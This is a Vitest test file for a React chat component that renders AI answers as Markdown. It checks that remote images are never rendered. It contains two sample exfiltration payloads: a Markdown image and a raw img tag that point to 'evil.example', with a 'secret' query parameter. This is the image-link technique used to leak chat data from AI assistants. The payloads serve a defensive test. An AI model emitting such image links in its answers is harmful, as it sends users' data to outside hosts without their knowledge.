import { createElement, type ComponentProps } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { NextIntlClientProvider } from "next-intl";
import { describe, expect, it } from "vitest";
import chat from "../../../../messages/en/chat.json";
import { AnswerMarkdown } from "@/features/chat/components/answer-markdown";

const render = (text: string) =>
  renderToStaticMarkup(
    createElement(
      NextIntlClientProvider,
      { locale: "en", messages: { chat } } as unknown as ComponentProps<
        typeof NextIntlClientProvider
      >,
      createElement(AnswerMarkdown, { text, chunks: [], streaming: false, onCite: () => {} }),
    ),
  );

describe("AnswerMarkdown", () => {
  it("never renders remote images, from Markdown or raw HTML", () => {
    const html = render(
      '![leak](https://evil.example/i.png?d=secret)\n\n<img src="https://evil.example/x.png">',
    );
    expect(html).not.toContain("evil.example");
    expect(html).toContain("[image: leak]");
  });
});
